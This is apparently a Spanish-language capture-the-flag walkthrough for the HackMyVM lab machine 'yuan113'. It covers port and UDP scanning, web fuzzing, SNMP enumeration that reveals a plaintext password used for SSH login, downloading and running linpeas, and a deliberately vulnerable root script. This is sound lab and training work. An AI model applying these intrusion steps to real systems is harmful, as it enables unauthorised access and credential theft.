---
title: "Hackmyvm: yuan113"
author: datadiego
draft: false
description: Maquina vulnerable yuan113
date: 2025-07-21
# la fecha va en formato año-mes-dia
tags:
  - pentesting
layout: layouts/post.njk
---

Descargada de [aqui](https://downloads.hackmyvm.eu/yuan113.zip). Debemos encontrar varias flags en la vm.

## Reconocimiento

Tenemos estos puertos:

```bash
~ ❯ nmap -sV 192.168.0.70
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-08 11:31 +0200
Nmap scan report for 192.168.0.70
Host is up (0.0069s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```

## Reconocimiento web

En `index.html` no hay nada especial, ni en la propia página ni en su código.

Usamos `fuff` para intentar extraer más páginas con `fuff -w /usr/share/wordlists/apache.txt -u http://192.168.0.70/FUZZ -v`

```bash
 [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m

 [2K| URL | http://192.168.0.70//.htaccess.bak

 [2K    * FUZZ: /.htaccess.bak


 [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m

 [2K| URL | http://192.168.0.70//.htpasswd

 [2K    * FUZZ: /.htpasswd


 [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4ms] [0m

 [2K| URL | http://192.168.0.70//.htaccess

 [2K    * FUZZ: /.htaccess


 [2K[Status: 200, Size: 796, Words: 268, Lines: 34, Duration: 3ms] [0m

 [2K| URL | http://192.168.0.70//index.html

 [2K    * FUZZ: /index.html


 [2K[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 327ms] [0m

 [2K| URL | http://192.168.0.70//server-status

 [2K    * FUZZ: /server-status


 [2K[Status: 200, Size: 796, Words: 268, Lines: 34, Duration: 3ms] [0m

 [2K| URL | http://192.168.0.70/index.html

 [2K    * FUZZ: index.html
```

En la página principal dicen " The quieter you become, the more you are able to hear."

Intentamos varios escaneos silenciosos, finalmente, con `-sU` descubrimos un puerto adicional:

```bash
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
MAC Address: 08:00:27:29:39:44 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```


Podemos usar `snmpwalk -vc2 -c public <ip>` para comunicarnos con el o un modulo de metasploit asi:

```bash
msfconsole
use auxiliary/scanner/snmp/snmp_enum
set RHOST 192.168.0.66
run
```


Podemos filtrar con grep:

```bash
 datadiego@debian  yuan113  main  18:02  snmpwalk -v2c -c public 192.168.0.66 | grep -i -E "user|pass|login|ssh|path|home"
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.25.4.2.1.2.384 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.411 = STRING: "sshd"
iso.3.6.1.2.1.25.4.2.1.4.377 = STRING: "service --user welcome --password mMOq2WWONQiiY8TinSRF --host localhost --port 8080"
```

Obtenemos un usuario y contraseña

## Entrando por OpenSSH

Probamos el usuario en el servicio SSH:

```bash
 datadiego@debian  ~  18:04  ssh welcome@192.168.0.66
The authenticity of host '192.168.0.66 (192.168.0.66)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.66' (ED25519) to the list of known hosts.
welcome@192.168.0.66's password: 
Linux 113 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan 14 08:32:23 2026 from 192.168.3.94
welcome@113:~$ whoami
welcome
welcome@113:~$ pwd
/home/welcome
welcome@113:~$ cat user.txt 
flag{user-21539141ad1bc8ab9d26420aecb2415b}
```

Encontramos una flag en el home del usuario que hemos encontrado.

## Explorando la VM

No hay nada más en `/home/welcome`

No hay nada en `/tmp`

Descargamos linpeas en la maquina con wget y lo ejecutamos.

Hay algunos archivos interesantes:

```bash
╔══════════╣ Executable files potentially added by user (limit 70) (T1083)
2026-01-14+08:36:37.6678938600 /usr/bin/mazesec
2026-01-14+08:35:06.7202883520 /opt/113.sh
2026-01-14+08:31:54.6147897100 /usr/local/bin/fake-monitoring-service
2025-04-11+22:22:32.8990844810 /etc/grub.d/10_linux
2025-04-11+22:07:00.9628442610 /etc/grub.d/40_custom
```

`/usr/local/bin/fake-monitoring-service` es el archivo del que hemos obtenido las credenciales del usuario `welcome`.

`/opt/113.sh` es un script que ejecuta otro script cuando pasamos 3 argumentos, siendo el ultimo obligatoriamente "mazesec":

```bash
#!/bin/bash

sandbox=$(mktemp -d)
cd $sandbox

if [ "$#" -ne 3 ];then
        exit
fi

if [ "$3" != "mazesec" ]
then
        echo "\$3 must be mazesec"
        exit
else
        /bin/cp /usr/bin/mazesec $sandbox
        exec_="$sandbox/mazesec"
fi

if [ "$1" = "exec_" ];then
        exit
fi

declare -- "$1"="$2"
$exec_
```

El script ejecutado es el que hay originalmente en `/usr/bin/mazesec`:

```bash
welcome@113:~$ cat /usr/bin/mazesec
#!/bin/bash

flag=$(echo $RANDOM$RANDOM$RAMDOM$RANDOM | md5sum | awk '{print $1}')
echo "flag{fakeroot-$flag}"
```

Cuando ejecutamos correctamente `113.sh` obtenemos una flag falsa, el resultado es el mismo que si ejecutamos directamente `mazesec`

```bash
welcome@113:~$ /opt/113.sh a b mazesec
flag{fakeroot-7bc233f12d07829b1f5eb3aebc9002ba}
welcome@113:~$ /usr/bin/mazesec
flag{fakeroot-b38cdd3a2863d9f00bd92598169de36a}
welcome@113:~$
```
